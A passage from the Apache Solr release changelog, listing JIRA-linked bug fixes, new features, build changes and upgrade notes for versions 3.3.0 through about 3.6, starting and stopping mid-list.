  14. [SOLR-2970](http://issues.apache.org/jira/browse/SOLR-2970): CSV ResponseWriter returns fields defined as stored=false in schema

      (janhoy)
  15. [LUCENE-3690](http://issues.apache.org/jira/browse/LUCENE-3690), [LUCENE-2208](http://issues.apache.org/jira/browse/LUCENE-2208), [SOLR-882](http://issues.apache.org/jira/browse/SOLR-882), [SOLR-42](http://issues.apache.org/jira/browse/SOLR-42): Re-implemented
      HTMLStripCharFilter as a JFlex-generated scanner and moved it to
      lucene/contrib/analyzers/common/. See below for a list of bug fixes and
      other changes. To get the same behavior as HTMLStripCharFilter in Solr
      version 3.5 and earlier (including the bugs), use LegacyHTMLStripCharFilter,
      which is the previous implementation.Behavior changes from the previous version:
      - Known offset bugs are fixed.
      - The "Mark invalid" exceptions reported in [SOLR-1283](http://issues.apache.org/jira/browse/SOLR-1283) are no longer
        triggered (the bug is still present in LegacyHTMLStripCharFilter).
      - The character entity "&apos;" is now always properly decoded.
      - More cases of <script> tags are now properly stripped.
      - CDATA sections are now handled properly.
      - Valid tag name characters now include the supplementary Unicode characters
        from Unicode character classes [:ID\_Start:] and [:ID\_Continue:].
      - Uppercase character entities "&QUOT;", "&COPY;", "&GT;", "&LT;", "&REG;",
        and "&AMP;" are now recognized and handled as if they were in lowercase.
      - The REPLACEMENT CHARACTER U+FFFD is now used to replace numeric character
        entities for unpaired UTF-16 low and high surrogates (in the range
        [U+D800-U+DFFF]).
      - Properly paired numeric character entities for UTF-16 surrogates are now
        converted to the corresponding code units.
      - Opening tags with unbalanced quotation marks are now properly stripped.
      - Literal "<" and ">" characters in opening tags, regardless of whether they
        appear inside quotation marks, now inhibit recognition (and stripping) of
        the tags. The only exception to this is for values of event-handler
        attributes, e.g. "onClick", "onLoad", "onSelect".
      - A newline '\n' is substituted instead of a space for stripped HTML markup.
      - Nothing is substituted for opening and closing inline tags - they are
        simply removed. The list of inline tags is (case insensitively): <a>,
        <abbr>, <acronym>, <b>, <basefont>, <bdo>, <big>, <cite>, <code>, <dfn>,
        <em>, <font>, <i>, <img>, <input>, <kbd>, <label>, <q>, <s>, <samp>,
        <select>, <small>, <span>, <strike>, <strong>, <sub>, <sup>, <textarea>,
        <tt>, <u>, and <var>.
      - HTMLStripCharFilterFactory now handles HTMLStripCharFilter's "escapedTags"
        feature: opening and closing tags with the given names, including any
        attributes and their values, are left intact in the output.(Steve Rowe)
  16. [LUCENE-3717](http://issues.apache.org/jira/browse/LUCENE-3717): Fixed offset bugs in TrimFilter, WordDelimiterFilter, and
      HyphenatedWordsFilter where they would create invalid offsets in
      some situations, leading to problems in highlighting.

      (Robert Muir)
  17. [SOLR-2280](http://issues.apache.org/jira/browse/SOLR-2280): commitWithin ignored for a delete query

      (Juan Grande via janhoy)
  18. [SOLR-3073](http://issues.apache.org/jira/browse/SOLR-3073): Fixed 'Invalid UUID string' error when having an UUID field as
      the unique key and executing a distributed grouping request.

      (Devon Krisman, Martijn van Groningen)
  19. [SOLR-3084](http://issues.apache.org/jira/browse/SOLR-3084): Fixed initialization error when using
      <queryResponseWriter default="true" ... />

      (Bernd Fehling and hossman)
  20. [SOLR-3109](http://issues.apache.org/jira/browse/SOLR-3109): Fixed numerous redundant shard requests when using distributed grouping.

      (rblack via Martijn van Groningen)
  21. [SOLR-3052](http://issues.apache.org/jira/browse/SOLR-3052): Fixed typo in distributed grouping parameters.

      (Martijn van Groningen, Grant Ingersoll)
  22. [SOLR-2909](http://issues.apache.org/jira/browse/SOLR-2909): Add support for ResourceLoaderAware tokenizerFactories in synonym
      filter factories.

      (Tom Klonikowski, Jun Ohtani via Koji Sekiguchi)
  23. [SOLR-3168](http://issues.apache.org/jira/browse/SOLR-3168): ReplicationHandler "numberToKeep" & "maxNumberOfBackups" parameters
      would keep only 1 backup, even if more than 1 was specified

      (Neil Hooey, James Dyer)
  24. [SOLR-3009](http://issues.apache.org/jira/browse/SOLR-3009): hitGrouped.vm isn't shipped with 3.x

      (ehatcher, janhoy)
  25. [SOLR-3195](http://issues.apache.org/jira/browse/SOLR-3195): timeAllowed is ignored for grouping queries

      (Russell Black via Martijn van Groningen)
  26. [SOLR-2124](http://issues.apache.org/jira/browse/SOLR-2124): Do not log stack traces for "Service Disabled" / 503 Exceptions (PingRequestHandler, etc)

      (James Dyer, others)
  27. [SOLR-3260](http://issues.apache.org/jira/browse/SOLR-3260): DataImportHandler: ScriptTransformer gives better error messages when
      problems arise on initalization (no Script Engine, invalid script, etc).

      (James Dyer)
  28. [SOLR-2959](http://issues.apache.org/jira/browse/SOLR-2959): edismax now respects the magic fields '\_val\_' and '\_query\_'

      (Michael Watts, hossman)
  29. [SOLR-3074](http://issues.apache.org/jira/browse/SOLR-3074): fix SolrPluginUtils.docListToSolrDocumentList to respect the
      list of fields specified. This fix also deprecates
      DocumentBuilder.loadStoredFields which is not used anywhere in Solr,
      and was fundamentally broken/bizarre.

      (hossman, Ahmet Arslan)
  30. [SOLR-2291](http://issues.apache.org/jira/browse/SOLR-2291): fix JSONWriter to respect field list when writing SolrDocuments

      (Ahmet Arslan via hossman)
  31. [SOLR-3264](http://issues.apache.org/jira/browse/SOLR-3264): Fix CoreContainer and SolrResourceLoader logging to be more
      clear about when SolrCores are being created, and stop misleading people
      about SolrCore instanceDir's being the "Solr Home Dir"

      (hossman)
  32. [SOLR-3046](http://issues.apache.org/jira/browse/SOLR-3046): Fix whitespace typo in DIH response "Time taken"

      (hossman)
  33. [SOLR-3261](http://issues.apache.org/jira/browse/SOLR-3261): Fix edismax to respect query operators when literal colons
      are used in query string.

      (Juan Grande via hossman)
  34. [SOLR-3226](http://issues.apache.org/jira/browse/SOLR-3226): Fix SignatureUpdateProcessor to no longer ignore non-String
      field values

      (Spyros Kapnissis, hossman)
  35. [SOLR-3200](http://issues.apache.org/jira/browse/SOLR-3200): Fix SignatureUpdateProcessor "all fields" mode to use all
      fields of each document instead of the fields specified by the first
      document indexed

      (Spyros Kapnissis via hossman)
  36. [SOLR-3316](http://issues.apache.org/jira/browse/SOLR-3316): Distributed grouping failed when rows parameter was set to 0 and
      sometimes returned a wrong hit count as matches.

      (Cody Young, Martijn van Groningen)
  37. [SOLR-3107](http://issues.apache.org/jira/browse/SOLR-3107): contrib/langid: When using the LangDetect implementation of
      langid, set the random seed to 0, so that the same document is detected as
      the same language with the same probability every time.

      (Christian Moen via rmuir)
  38. [SOLR-2937](http://issues.apache.org/jira/browse/SOLR-2937): Configuring the number of contextual snippets used for
      search results clustering. The hl.snippets parameter is now respected
      by the clustering plugin, can be overridden by carrot.summarySnippets
      if needed

      (Stanislaw Osinski).
  39. [SOLR-2938](http://issues.apache.org/jira/browse/SOLR-2938): Clustering on multiple fields. The carrot.title and
      carrot.snippet can now take comma- or space-separated lists of
      field names to cluster

      (Stanislaw Osinski).
  40. [SOLR-2939](http://issues.apache.org/jira/browse/SOLR-2939): Clustering of multilingual search results. The document's
      language field be passed in the carrot.lang parameter, the carrot.lcmap
      parameter enables mapping of language codes to ISO 639

      (Stanislaw Osinski).
  41. [SOLR-2940](http://issues.apache.org/jira/browse/SOLR-2940): Passing values for custom Carrot2 fields to Clustering component.
      The custom field mapping are defined using the carrot.custom parameter

      (Stanislaw Osinski).
  42. [SOLR-2941](http://issues.apache.org/jira/browse/SOLR-2941): NullPointerException on clustering component initialization
      when schema does not have a unique key field

      (Stanislaw Osinski).
  43. [SOLR-2942](http://issues.apache.org/jira/browse/SOLR-2942): ClassCastException when passing non-textual fields to
      clustering component

      (Stanislaw Osinski).
+ Other Changes   (16)
  1. [SOLR-2922](http://issues.apache.org/jira/browse/SOLR-2922): Upgrade commons-io and commons-lang to 2.1 and 2.6, respectively.

     (koji)
  2. [SOLR-2920](http://issues.apache.org/jira/browse/SOLR-2920): Refactor frequent conditional use of DefaultSolrParams and
     AppendedSolrParams into factory methods.

     (David Smiley via hossman)
  3. [SOLR-3032](http://issues.apache.org/jira/browse/SOLR-3032): Deprecate logOnce from SolrException logOnce and all the supporting
     structure will disappear in 4.0. Errors should be caught and logged at the
     top-most level or logged and NOT propagated up the chain.

     (Erick Erickson)
  4. [SOLR-2718](http://issues.apache.org/jira/browse/SOLR-2718): Add ability to lazy load response writers, defined with startup="lazy".

     (ehatcher)
  5. [SOLR-2901](http://issues.apache.org/jira/browse/SOLR-2901): Upgrade Solr to Tika 1.0

     (janhoy)
  6. [SOLR-3059](http://issues.apache.org/jira/browse/SOLR-3059): Example XSL stylesheet for indexing query result XML

     (janhoy)
  7. [SOLR-3097](http://issues.apache.org/jira/browse/SOLR-3097), [SOLR-3105](http://issues.apache.org/jira/browse/SOLR-3105): Add analysis configurations for different languages to
     the example.

     (Christian Moen, Robert Muir)
  8. [SOLR-3005](http://issues.apache.org/jira/browse/SOLR-3005): Default QueryResponseWriters are now initialized via init() with an empty
     NamedList.

     (Gasol Wu, Chris Male)
  9. [SOLR-3140](http://issues.apache.org/jira/browse/SOLR-3140): Upgrade schema version to 1.5, where omitNorms defaults to "true" for all
     primitive (non-analyzed) field types such as int, float, date, bool, string..

     (janhoy)
  10. [SOLR-3077](http://issues.apache.org/jira/browse/SOLR-3077): Better error messages when attempting to use "blank" field names

      (Antony Stubbs via hossman)
  11. [SOLR-2712](http://issues.apache.org/jira/browse/SOLR-2712): expecting fl=score to return all fields is now deprecated.
      In solr 4.0, this will only return the score.

      (ryan)
  12. [SOLR-3156](http://issues.apache.org/jira/browse/SOLR-3156): Check for Lucene directory locks at startup. In previous versions
      this check was only performed during modifying (e.g. adding and deleting
      documents) the index.

      (Luca Cavanna via Martijn van Groningen)
  13. [SOLR-1052](http://issues.apache.org/jira/browse/SOLR-1052): Deprecated <indexDefaults> and <mainIndex> in solrconfig.xml
      From now, all settings go in the new <indexConfig> tag, and some defaults are
      changed: useCompoundFile=false, ramBufferSizeMB=32, lockType=native, so that
      the effect of NOT specifying <indexConfig> at all gives same result as the
      example config used to give in 3.5

      (janhoy, gsingers)
  14. [SOLR-3294](http://issues.apache.org/jira/browse/SOLR-3294): In contrib/clustering/lib/, replaced the manually retrowoven
      Java 1.5-compatible carrot2-core-3.5.0.jar (which is not publicly available,
      except from the Solr Subversion repository), with newly released Java
      1.5-compatible carrot2-core-3.5.0.1.jar (hosted on the Maven Central
      repository). Also updated dependencies jackson-core-asl and
      jackson-mapper-asl (both v1.5.2 -> v1.7.4).

      (Dawid Weiss, Steve Rowe)
  15. [SOLR-3295](http://issues.apache.org/jira/browse/SOLR-3295): netcdf jar is excluded from the binary release (and disabled in
      ivy.xml) because it requires java 6. If you want to parse this content with
      extracting request handler and are willing to use java 6, just add the jar.

      (rmuir)
  16. [SOLR-3142](http://issues.apache.org/jira/browse/SOLR-3142): DIH Imports no longer default optimize to true, instead false.
      If you want to force all segments to be merged into one, you can specify
      this parameter yourself. NOTE: this can be very expensive operation and
      usually does not make sense for delta-imports.

      (Robert Muir)
+ Build   (5)
  1. [SOLR-2487](http://issues.apache.org/jira/browse/SOLR-2487): Add build target to package war without slf4j jars

     (janhoy)
  2. [SOLR-3112](http://issues.apache.org/jira/browse/SOLR-3112): Fix tests not to write to src/test-files

     (Luca Cavanna via Robert Muir)
  3. [LUCENE-3753](http://issues.apache.org/jira/browse/LUCENE-3753): Restructure the Solr build system.

     (Steve Rowe)
  4. [SOLR-3204](http://issues.apache.org/jira/browse/SOLR-3204): The packaged pre-release artifact of Commons CSV used the original
     package name (org.apache.commons.csv). This created a compatibility issue as
     the Apache Commons team works toward an official release of Commons CSV.
     The source of Commons CSV was added under a separate package name to the
     Solr source code.

     (Uwe Schindler, Chris Male, Emmanuel Bourg)
  5. [LUCENE-3930](http://issues.apache.org/jira/browse/LUCENE-3930): Changed build system to use Apache Ivy for retrival of 3rd
     party JAR files. Please review README.txt for instructions.

     (Robert Muir, Chris Male, Uwe Schindler, Steven Rowe, Hossman)

### Release 3.5.0 [2011-11-27]

+ New Features   (11)
  1. [SOLR-2749](http://issues.apache.org/jira/browse/SOLR-2749): Add boundary scanners for FastVectorHighlighter. <boundaryScanner/>
     can be specified with a name in solrconfig.xml, and use hl.boundaryScanner=name
     parameter to specify the named <boundaryScanner/>.

     (koji)
  2. [SOLR-2066](http://issues.apache.org/jira/browse/SOLR-2066),[SOLR-2776](http://issues.apache.org/jira/browse/SOLR-2776): Added support for distributed grouping.

     (Martijn van Groningen, Jasper van Veghel, Matt Beaumont)
  3. [SOLR-2769](http://issues.apache.org/jira/browse/SOLR-2769): Added factory for the new Hunspell stemmer capable of doing stemming
     for 99 languages

     (janhoy, cmale)
  4. [SOLR-1979](http://issues.apache.org/jira/browse/SOLR-1979): New contrib "langid". Adds language identification capabilities as an
     Update Processor, using Tika's LanguageIdentifier or Cybozu language-detection
     library

     (janhoy, Tommaso Teofili, gsingers)
  5. [SOLR-2818](http://issues.apache.org/jira/browse/SOLR-2818): Added before/after count response parsing support for range facets in
     SolrJ.

     (Bernhard Frauendienst via Martijn van Groningen)
  6. [SOLR-2276](http://issues.apache.org/jira/browse/SOLR-2276): Add support for cologne phonetic to PhoneticFilterFactory.

     (Marc Pompl via rmuir)
  7. [SOLR-1926](http://issues.apache.org/jira/browse/SOLR-1926): Add hl.q parameter.

     (koji)
  8. [SOLR-2881](http://issues.apache.org/jira/browse/SOLR-2881): Numeric types now support sortMissingFirst/Last. This includes Trie and date types

     (Ryan McKinley, Mike McCandless, Uwe Schindler, Erick Erickson)
  9. [SOLR-1023](http://issues.apache.org/jira/browse/SOLR-1023): StatsComponent now supports date fields and string fields.

     (Chris Male, Mark Holland, Gunnlaugur Thor Briem, Ryan McKinley)
  10. [SOLR-2578](http://issues.apache.org/jira/browse/SOLR-2578): ReplicationHandler's backup command now supports a 'numberToKeep'
      request param that can be used to delete all but the most recent N backups.

      (James Dyer via hossman)
  11. [SOLR-2839](http://issues.apache.org/jira/browse/SOLR-2839): Add alternative implementation to contrib/langid supporting 53
      languages, based on <http://code.google.com/p/language-detection/>

      (rmuir)
+ Optimizations   (1)
  1. [SOLR-2742](http://issues.apache.org/jira/browse/SOLR-2742): SolrJ: Provide commitWithinMs as optional parameter for all add() methods,
     making the feature more conveniently accessible for developers

     (janhoy)
+ Bug Fixes   (11)
  1. [SOLR-2748](http://issues.apache.org/jira/browse/SOLR-2748): The CommitTracker used for commitWith or autoCommit by maxTime
     could commit too frequently and could block adds until a new searcher was
     registered.

     (yonik)
  2. [SOLR-2726](http://issues.apache.org/jira/browse/SOLR-2726): Fixed NullPointerException when using spellcheck.q with Suggester.

     (Bernd Fehling, valentin via rmuir)
  3. [SOLR-2772](http://issues.apache.org/jira/browse/SOLR-2772): Fixed Date parsing/formatting of years 0001-1000

     (hossman)
  4. [SOLR-2763](http://issues.apache.org/jira/browse/SOLR-2763): Extracting update request handler throws exception and returns 400
     when zero-length file posted using multipart form post

     (janhoy)
  5. [SOLR-2780](http://issues.apache.org/jira/browse/SOLR-2780): Fixed issue where multi select facets didn't respect group.truncate parameter.

     (Martijn van Groningen, Ramzi Alqrainy)
  6. [SOLR-2793](http://issues.apache.org/jira/browse/SOLR-2793): In rare cases (most likely during shutdown), a SolrIndexSearcher can be left
     open if the executor rejects a task.

     (Mark Miller)
  7. [SOLR-2791](http://issues.apache.org/jira/browse/SOLR-2791): Replication: abortfetch command is broken if replication was started
     by fetchindex command instead of a regular poll

     (Yury Kats via shalin)
  8. [SOLR-2861](http://issues.apache.org/jira/browse/SOLR-2861): Fix extremely rare race condition on commit that can result
     in a NPE

     (yonik)
  9. [SOLR-2813](http://issues.apache.org/jira/browse/SOLR-2813): Fix HTTP error codes returned when requests contain strings that
     can not be parsed as numbers for Trie fields.

     (Jeff Crump and hossman)
  10. [SOLR-2902](http://issues.apache.org/jira/browse/SOLR-2902): List of collations are wrong parsed in SpellCheckResponse causing
      a wrong number of collation results in the response.

      (Bastiaan Verhoef, James Dyer via Simon Willnauer)
  11. [SOLR-2875](http://issues.apache.org/jira/browse/SOLR-2875): Fix the incorrect url in DIH example tika-data-config.xml

      (Shinichiro Abe via koji)
+ Other Changes   (13)
  1. [SOLR-2750](http://issues.apache.org/jira/browse/SOLR-2750): Make both "update.chain" and the deprecated "update.param" work
     consistently everywhere; see also [SOLR-2105](http://issues.apache.org/jira/browse/SOLR-2105).

     (Mark Miller, janhoy)
  2. [LUCENE-3410](http://issues.apache.org/jira/browse/LUCENE-3410): Deprecated the WordDelimiterFilter constructors accepting multiple
     ints masquerading as booleans. Preferred constructor now accepts a single int
     bitfield

     (Chris Male)
  3. [SOLR-2758](http://issues.apache.org/jira/browse/SOLR-2758): Moved ConcurrentLRUCache from o.a.s.common.util package in the solrj
     module to the o.a.s.util package in the Solr core module.

     (David Smiley via Steve Rowe)
  4. [SOLR-2766](http://issues.apache.org/jira/browse/SOLR-2766): Package individual javadoc sites for solrj and test-framework.

     (Steve Rowe, Mike McCandless)
  5. [SOLR-2771](http://issues.apache.org/jira/browse/SOLR-2771): Solr modules' tests should not depend on solr-core test classes;
     move BufferingRequestProcessor from solr-core tests to test-framework so that
     the Solr Cell module can use it.

     (janhoy, Steve Rowe)
  6. [LUCENE-3457](http://issues.apache.org/jira/browse/LUCENE-3457): Upgrade commons-compress to 1.2

     (Doron Cohen)
  7. [SOLR-2757](http://issues.apache.org/jira/browse/SOLR-2757): min() and max() functions now support an arbitrary number of
     ValueSources

     (Bill Bell via hossman)
  8. [SOLR-2372](http://issues.apache.org/jira/browse/SOLR-2372): Upgrade Solr to Tika 0.10

     (janhoy)
  9. [SOLR-2792](http://issues.apache.org/jira/browse/SOLR-2792): Allow case insensitive Hunspell stemming

     (janhoy, rmuir)
  10. [SOLR-2862](http://issues.apache.org/jira/browse/SOLR-2862): More explicit lexical resources location logged if Carrot2 clustering
      extension is used. Fixed solr. impl. of IResource and IResourceLookup.

      (Dawid Weiss)
  11. [SOLR-2849](http://issues.apache.org/jira/browse/SOLR-2849): Fix dependencies in Maven POMs.

      (David Smiley via Steve Rowe)
  12. [SOLR-2591](http://issues.apache.org/jira/browse/SOLR-2591): Remove commitLockTimeout option from solrconfig.xml

      (Luca Cavanna via Martijn van Groningen)
  13. [SOLR-2746](http://issues.apache.org/jira/browse/SOLR-2746): Upgraded UIMA dependencies from \*-2.3.1-SNAPSHOT.jar to \*-2.3.1.jar.

### Release 3.4.0 [2011-09-15]

+ Upgrading from Solr 3.3   (3)
  1. The Lucene index format has changed and as a result, once you upgrade,
     previous versions of Solr will no longer be able to read your indices.
     In a master/slave configuration, all searchers/slaves should be upgraded
     before the master. If the master were to be updated first, the older
     searchers would not be able to read the new index format.
  2. Previous versions of Solr silently allow and ignore some contradictory
     properties specified in schema.xml. For example:
     - indexed="false" omitNorms="false"
     - indexed="false" omitTermFreqAndPositions="false"Field property validation has now been fixed, to ensure that
     contradictions like these now generate error messages. If users
     have existing schemas that generate one of these new "conflicting
     'false' field options for non-indexed field" error messages the
     conflicting "omit\*" properties can safely be removed, or changed to
     "true" for consistent behavior with previous Solr versions. This
     situation has now been fixed to cause an error on startup when these
     contradictory options. See [SOLR-2669](http://issues.apache.org/jira/browse/SOLR-2669).
  3. FacetComponent no longer catches and embeds exceptions occurred during facet
     processing, it throws HTTP 400 or 500 exceptions instead.
+ New Features   (14)
  1. [SOLR-2540](http://issues.apache.org/jira/browse/SOLR-2540): CommitWithin as an Update Request parameter
     You can now specify &commitWithin=N (ms) on the update request

     (janhoy)
  2. [SOLR-2458](http://issues.apache.org/jira/browse/SOLR-2458): post.jar enhanced to handle JSON, CSV and <optimize>

     (janhoy)
  3. [LUCENE-3234](http://issues.apache.org/jira/browse/LUCENE-3234): add a new parameter hl.phraseLimit for FastVectorHighlighter speed up.

     (Mike Sokolov via koji)
  4. [SOLR-2429](http://issues.apache.org/jira/browse/SOLR-2429): Ability to add cache=false to queries and query filters to avoid
     using the filterCache or queryCache. A cost may also be specified and is used
     to order the evaluation of non-cached filters from least to greatest cost .
     For very expensive query filters (cost >= 100) if the query implements
     the PostFilter interface, it will be used to obtain a Collector that is
     checked only for documents that match the main query and all other filters.
     The "frange" query now implements the PostFilter interface.

     (yonik)
  5. [SOLR-2630](http://issues.apache.org/jira/browse/SOLR-2630): Added new XsltUpdateRequestHandler that works like
     XmlUpdateRequestHandler but allows to transform the POSTed XML document
     using XSLT. This allows to POST arbitrary XML documents to the update
     handler, as long as you also provide a XSL to transform them to a valid
     Solr input document.

     (Upayavira, Uwe Schindler)
  6. [SOLR-2615](http://issues.apache.org/jira/browse/SOLR-2615): Log individual updates (adds and deletes) at the FINE level
     before adding to the index. Fix a null pointer exception in logging
     when there was no unique key.

     (David Smiley via yonik)
  7. [LUCENE-2048](http://issues.apache.org/jira/browse/LUCENE-2048): Added omitPositions to the schema, so you can omit position
     information while still indexing term frequencies.

     (rmuir)
  8. [SOLR-2584](http://issues.apache.org/jira/browse/SOLR-2584): add UniqFieldsUpdateProcessor that removes duplicate values in the
     specified fields.

     (Elmer Garduno, koji)
  9. [SOLR-2670](http://issues.apache.org/jira/browse/SOLR-2670): Added NIOFSDirectoryFactory

     (yonik)
  10. [SOLR-2523](http://issues.apache.org/jira/browse/SOLR-2523): Added support in SolrJ to easily interact with range facets.
      The range facet response can be parsed and is retrievable from the
      QueryResponse class. The SolrQuery class has convenient methods for using
      range facets.

      (Martijn van Groningen)
  11. [SOLR-2637](http://issues.apache.org/jira/browse/SOLR-2637): Added support for group result parsing in SolrJ.

      (Tao Cheng, Martijn van Groningen)
  12. [SOLR-2665](http://issues.apache.org/jira/browse/SOLR-2665): Added post group faceting. Facet counts are based on the most
      relevant document of each group matching the query. This feature has the
      same impact on the StatsComponent.

      (Martijn van Groningen)
  13. [SOLR-2675](http://issues.apache.org/jira/browse/SOLR-2675): CoreAdminHandler now allows arbitrary properties to be
      specified when CREATEing a new SolrCore using property.\* request
      params.

      (Yury Kats, hossman)
  14. [SOLR-2714](http://issues.apache.org/jira/browse/SOLR-2714): JSON update format - "null" field values are now dropped
      instead of causing an exception.

      (Trygve LaugstÃ¸l, yonik)
+ Optimizations   (1)
  1. [LUCENE-3233](http://issues.apache.org/jira/browse/LUCENE-3233): Improved memory usage, build time, and performance of
     SynonymFilterFactory.

     (Mike McCandless, Robert Muir)
+ Bug Fixes   (24)
  1. [SOLR-2625](http://issues.apache.org/jira/browse/SOLR-2625): TermVectorComponent throws NPE if TF-IDF option is used without DF
     option.

     (Daniel Erenrich, Simon Willnauer)
  2. [SOLR-2631](http://issues.apache.org/jira/browse/SOLR-2631): PingRequestHandler should not allow to ping itself using "qt"
     param to prevent infinite loop.

     (Edoardo Tosca, Uwe Schindler)
  3. [SOLR-2636](http://issues.apache.org/jira/browse/SOLR-2636): Fix explain functionality for negative queries.

     (Tom Hill via yonik)
  4. [SOLR-2538](http://issues.apache.org/jira/browse/SOLR-2538): Range Faceting on long/double fields could overflow if values
     bigger then the max int/float were used.

     (Erbi Hanka, hossman)
  5. [SOLR-2230](http://issues.apache.org/jira/browse/SOLR-2230): CommonsHttpSolrServer.addFile could not be used to send
     multiple files in a single request.

     (Stephan GÃ¼nther, hossman)
  6. [SOLR-2541](http://issues.apache.org/jira/browse/SOLR-2541): PluginInfos was not correctly parsing <long/> tags when
     initializing plugins

     (Frank Wesemann, hossman)
  7. [SOLR-2623](http://issues.apache.org/jira/browse/SOLR-2623): Solr JMX MBeans do not survive core reloads

     (Alexey Serba, shalin)
  8. Fixed grouping bug when start is bigger than rows and format is simple that zero documents are returned even
     if there are documents to display.

     (Martijn van Groningen, Nikhil Chhaochharia)
  9. [SOLR-2564](http://issues.apache.org/jira/browse/SOLR-2564): Fixed ArrayIndexOutOfBoundsException when using simple format and
     start > 0

     (Martijn van Groningen, Matteo Melli)
  10. [SOLR-2642](http://issues.apache.org/jira/browse/SOLR-2642): Fixed sorting by function when using grouping.

      (Thomas Heigl, Martijn van Groningen)
  11. [SOLR-2535](http://issues.apache.org/jira/browse/SOLR-2535): REGRESSION: in Solr 3.x and trunk the admin/file handler
      fails to show directory listings

      (David Smiley, Peter Wolanin via Erick Erickson)
  12. [SOLR-2545](http://issues.apache.org/jira/browse/SOLR-2545): ExternalFileField file parsing would fail if any key
      contained an "=" character. It now only looks for the last "=" delimiter
      prior to the float value.

      (Markus Jelsma, hossman)
  13. [SOLR-2662](http://issues.apache.org/jira/browse/SOLR-2662): When Solr is configured to have no queryResultCache, the
      "start" parameter was not honored and the documents returned were
      0 through start+offset.

      (Markus Jelsma, yonik)
  14. [SOLR-2669](http://issues.apache.org/jira/browse/SOLR-2669): Fix backwards validation of field properties in
      SchemaField.calcProps

      (hossman)
  15. [SOLR-2676](http://issues.apache.org/jira/browse/SOLR-2676): Add "welcome-file-list" to solr.war so admin UI works correctly
      in servlet containers such as WebSphere that do not use a default list

      (Jay R. Jaeger, hossman)
  16. [SOLR-2606](http://issues.apache.org/jira/browse/SOLR-2606): Fixed sort parsing of fields containing punctuation that
      failed due to sort by function changes introduced in [SOLR-1297](http://issues.apache.org/jira/browse/SOLR-1297)

      (Mitsu Hadeishi, hossman)
  17. [SOLR-2706](http://issues.apache.org/jira/browse/SOLR-2706): contrib/clustering: The carrot.lexicalResourcesDir parameter
      now works with absolute directories

      (Stanislaw Osinski)
  18. [SOLR-2692](http://issues.apache.org/jira/browse/SOLR-2692): contrib/clustering: Typo in param name fixed: "carrot.fragzise"
      changed to "carrot.fragSize"

      (Stanislaw Osinski).
  19. [SOLR-2644](http://issues.apache.org/jira/browse/SOLR-2644): When using DIH with threads=2 the default logging is set too high

      (Bill Bell via shalin)
  20. [SOLR-2492](http://issues.apache.org/jira/browse/SOLR-2492): DIH does not commit if only deletes are processed

      (James Dyer via shalin)
  21. [SOLR-2186](http://issues.apache.org/jira/browse/SOLR-2186): DataImportHandler's multi-threaded option throws NPE

      (Lance Norskog, Frank Wesemann, shalin)
  22. [SOLR-2655](http://issues.apache.org/jira/browse/SOLR-2655): DIH multi threaded mode does not resolve attributes correctly

      (Frank Wesemann, shalin)
  23. [SOLR-2695](http://issues.apache.org/jira/browse/SOLR-2695): DIH: Documents are collected in unsynchronized list in
      multi-threaded debug mode

      (Michael McCandless, shalin)
  24. [SOLR-2668](http://issues.apache.org/jira/browse/SOLR-2668): DIH multithreaded mode does not rollback on errors from
      EntityProcessor

      (Frank Wesemann, shalin)
+ Other Changes   (2)
  1. [SOLR-2629](http://issues.apache.org/jira/browse/SOLR-2629): Eliminate deprecation warnings in some JSPs.

     (Bernd Fehling, hossman)
  2. [SOLR-2743](http://issues.apache.org/jira/browse/SOLR-2743): Remove commons logging from contrib/extraction.

     (koji)
+ Build   (2)
  1. [SOLR-2452](http://issues.apache.org/jira/browse/SOLR-2452),[SOLR-2653](http://issues.apache.org/jira/browse/SOLR-2653),[LUCENE-3323](http://issues.apache.org/jira/browse/LUCENE-3323),[SOLR-2659](http://issues.apache.org/jira/browse/SOLR-2659),[LUCENE-3329](http://issues.apache.org/jira/browse/LUCENE-3329),[SOLR-2666](http://issues.apache.org/jira/browse/SOLR-2666):
     Rewrote the Solr build system:
     - Integrated more fully with the Lucene build system: generalized the
       Lucene build system and eliminated duplication.
     - Converted all Solr contribs to the Lucene/Solr conventional src/ layout:
       java/, resources/, test/, and test-files/<contrib-name>.
     - Created a new Solr-internal module named "core" by moving the java/,
       test/, and test-files/ directories from solr/src/ to solr/core/src/.
     - Merged solr/src/webapp/src/ into solr/core/src/java/.
     - Eliminated solr/src/ by moving all its directories up one level;
       renamed solr/src/site/ to solr/site-src/ because solr/site/ already
       exists.
     - Merged solr/src/common/ into solr/solrj/src/java/.
     - Moved o.a.s.client.solrj.\* and o.a.s.common.\* tests from
       solr/src/test/ to solr/solrj/src/test/.
     - Made the solrj tests not depend on the solr core tests by moving
       some classes from solr/src/test/ to solr/test-framework/src/java/.
     - Each internal module (core/, solrj/, test-framework/, and webapp/)
       now has its own build.xml, from which it is possible to run
       module-specific targets. solr/build.xml delegates all build
       tasks (via <ant dir="internal-module-dir"> calls) to these
       modules' build.xml files.(Steve Rowe, Robert Muir)
  2. [LUCENE-3406](http://issues.apache.org/jira/browse/LUCENE-3406): Add ant target 'package-local-src-tgz' to Lucene and Solr
     to package sources from the local working copy.

     (Seung-Yeoul Yang via Steve Rowe)
+ Documentation   (none)

### Release 3.3.0 [2011-07-10]

+ Upgrading from Solr 3.2.0   (1)
  1. SolrCore's CloseHook API has been changed in a backward-incompatible way. It
     has been changed from an interface to an abstract class. Any custom
     components which use the SolrCore.addCloseHook method will need to
     be modified accordingly. To migrate, put your old CloseHook#close impl into
     CloseHook#preClose.
+ New Features   (7)
  1. [SOLR-2378](http://issues.apache.org/jira/browse/SOLR-2378): A new, automaton-based, implementation of suggest (autocomplete)
     component, offering an order of magnitude smaller memory consumption
     compared to ternary trees and jaspell and very fast lookups at runtime.

     (Dawid Weiss)
  2. [SOLR-2400](http://issues.apache.org/jira/browse/SOLR-2400): Field- and DocumentAnalysisRequestHandler now provide a position
     history for each token, so you can follow the token through all analysis stages.
     The output contains a separate int[] attribute containing all positions from
     previous Tokenizers/TokenFilters (called "positionHistory").

     (Uwe Schindler)
  3. [SOLR-2524](http://issues.apache.org/jira/browse/SOLR-2524): ([SOLR-236](http://issues.apache.org/jira/browse/SOLR-236), [SOLR-237](http://issues.apache.org/jira/browse/SOLR-237), [SOLR-1773](http://issues.apache.org/jira/browse/SOLR-1773), [SOLR-1311](http://issues.apache.org/jira/browse/SOLR-1311)) Grouping / Field collapsing
     using the Lucene grouping contrib. The search result can be grouped by field and query.

     (Martijn van Groningen, Emmanuel Keller, Shalin Shekhar Mangar, Koji Sekiguchi,
     IvÃ¡n de Prado, Ryan McKinley, Marc Sturlese, Peter Karich, Bojan Smid,
     Charles Hornberger, Dieter Grad, Dmitry Lihachev, Doug Steigerwald,
